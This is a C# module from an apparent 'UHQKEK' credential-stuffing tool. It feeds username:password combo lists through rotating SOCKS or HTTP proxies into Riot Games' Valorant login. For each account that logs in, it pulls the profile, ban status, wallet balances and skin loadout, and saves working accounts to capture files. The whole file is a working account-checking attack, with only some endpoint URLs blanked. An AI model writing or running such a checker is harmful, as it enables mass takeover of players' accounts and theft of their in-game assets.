using Leaf.xNet;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class Valorant
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "RiotClient/30.0.1.3715678.3712489 rso-auth (Windows;10;;Professional, x64)");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                httpRequest.AddHeader("Host", "auth.riotgames.com");
                httpRequest.AddHeader("Accept", "application/json");
                string str1 = httpRequest.Post("URL HERE", "{\"acr_values\":\"urn:riot:bronze\",\"claims\":\"\",\"client_id\":\"riot-client\",\"nonce\":\"ih0ckcv8kNAghtFLBfyAwQ\",\"redirect_uri\":\"http://localhost/redirect\",\"response_type\":\"token id_token\",\"scope\":\"openid link ban lol_region\"}", "application/json").ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "auth.riotgames.com");
                httpRequest.AddHeader("user-agent", "RiotClient/30.0.1.3715678.3712489 rso-auth (Windows;10;;Professional, x64)");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Accept", "application/json");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                string str2 = httpRequest.Put("URL HERE", "{\"language\":\"en_US\",\"password\":\""+strArray1[1]+ "\",\"region\":null,\"remember\":false,\"type\":\"auth\",\"username\":\""+strArray1[0]+ "\"}", "application/json").ToString();

                if (str2.Contains("access_token"))
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("origin", "https://auth.riotgames.com");
                    httpRequest.AddHeader("referer", "https://auth.riotgames.com/login");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.424");
                    string str3 = httpRequest.Post("URL HERE", "{\"client_id\":\"player-support-zendesk\",\"redirect_uri\":\"https://login.playersupport.riotgames.com/login_callback\",\"response_type\":\"code\",\"scope\":\"openid email\",\"ui_locales\":\"en-us en-us\"}", "application/json").ToString();

                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("User-Agent", "RiotClient/17.1.0 (rso-auth)");
                    httpRequest.AddHeader("Accept", "*/*");
                    httpRequest.AddHeader("Proxy-Connection", "keep-alive");
                    httpRequest.AddHeader("Content-Type", "application/json");
                    httpRequest.AddHeader("Host", "auth.riotgames.com");
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                    httpRequest.AddHeader("Connection", "keep-alive");
                    string str4 = httpRequest.Post("URL HERE", "{\"acr_values\":\"urn:riot:bronze\",\"claims\":\"\",\"client_id\":\"riot-client\",\"nonce\":\"oYnVwCSrlS5IHKh7iI17oQ\",\"redirect_uri\":\"http://localhost/redirect\",\"response_type\":\"token id_token\",\"scope\":\"openid link ban lol_region\"}", "application/json").ToString();

                    string tok = Cryptography.LR(str4, "token=", "&scop").FirstOrDefault();
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    httpRequest.AddHeader("Accept", "*/*");
                    httpRequest.AddHeader("Authorization", "Bearer "+tok);
                    string str5 = httpRequest.Post("https://entitlements.auth.riotgames.com/api/token/v1", " ", "application/json").ToString();
                    JObject json = JObject.Parse(str5);
                    string text3 = json["entitlements_token"].ToString();

                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    httpRequest.AddHeader("Accept", "*/*");
                    httpRequest.AddHeader("Authorization", "Bearer " + tok);
                    httpRequest.AddHeader("X-Riot-Entitlements-JWT", ""+text3);
                    string str6 = httpRequest.Post("https://auth.riotgames.com/userinfo", "", "application/json").ToString();
                    JObject capture = JObject.Parse(str6);
                    string username = capture["username"].ToString();
                    string game_name = capture["game_name"].ToString();
                    string LEVEL = capture["summoner_level"].ToString();
                    string pvpnet_account_id = capture["pvpnet_account_id"].ToString();
                    string country = capture["cpid"].ToString();
                    string cpid = capture["cpid"].ToString();
                    string nickname = capture["summoner_name"].ToString();
                    string sub = capture["sub"].ToString();
                    string email_verified = capture["email_verified"].ToString();

                    if (str6.Contains("ban\":{\"code\":null"))
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        httpRequest.AddHeader("Accept", "*/*");
                        httpRequest.AddHeader("Authorization", "Bearer " + tok);
                        httpRequest.AddHeader("X-Riot-Entitlements-JWT", "" + text3);
                        string str7 = httpRequest.Post("https://pd.eu.a.pvp.net/store/v1/wallet/" + sub, "", "application/x-www-form-urlencoded").ToString();
                        JObject balcap = JObject.Parse(str7);
                        if (str7.Contains("MISSING_ENTITLEMENT"))
                        {
                            ++Program.Free;
                            ++Program.Check;
                            ++Program.Cps;
                            if (Program.Lock == "Y")
                            {
                                Console.WriteLine($" [+] {combo} ", Color.Orange);
                            }
                            Program.Save(combo, "Valo Banned");
                            return true;
                        }
                        else if (str7.Contains("{\"Balances\":{\""))
                        {
                            string valopoint = balcap["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"].ToString();
                            string radpoint = balcap["e59aa87c-4cbf-517a-5983-6e81511be9b7"].ToString();

                            httpRequest.ClearAllHeaders();
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.AddHeader("Authorization", "Bearer " + tok);
                            httpRequest.AddHeader("X-Riot-Entitlements-JWT", "" + text3);
                            string str8 = httpRequest.Post("https://pd.eu.a.pvp.net/personalization/v2/players/" + sub + "/playerloadout", "", "application/x-www-form-urlencoded").ToString();
                            JObject skinscap = JObject.Parse(str8);
                            string skinid = skinscap["SkinID"].ToString();

                            Interlocked.Increment(ref Program.Good);
                            ++Program.Check;
                            ++Program.Cps;
                            Program.remove(combo);
                            if (Program.Lock == "Y")
                            {
                                Console.WriteLine($" [+] {combo} || UserName: {username} || GameName: {game_name} || Level: {LEVEL} || AccountID: {pvpnet_account_id} || Country: {country} || NickName: {nickname} || EmailVerified: {email_verified}", Color.Green);
                            }
                            Program.Save($" [+] {combo} || UserName: {username} || GameName: {game_name} || Level: {LEVEL} || AccountID: {pvpnet_account_id} || Country: {country} || NickName: {nickname} || EmailVerified: {email_verified}", "Valorant Capture");
                            return true;
                        }
                        else
                        {
                            //Console.WriteLine(str7);
                            ++Program.Retrie;
                            return false;
                        }
                    }
                    else if(str6.Contains("Player banned"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "Valo Banned");
                        return true;
                    }
                    else if (cpid.Contains("LA"))
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        //Program.Save(combo, "Invalids");
                        return true;
                    }
                    else
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "Valo No Cap");
                        return true;
                    }
                }
                else if (str2.Contains("auth_failure"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    Console.WriteLine(str2);
                    ++Program.Retrie;
                    return false;
                }
            }
            catch(Exception ex)
            {
                //Console.WriteLine(ex);
                ++Program.Retrie;
                return false;
            }
        }
    }
}
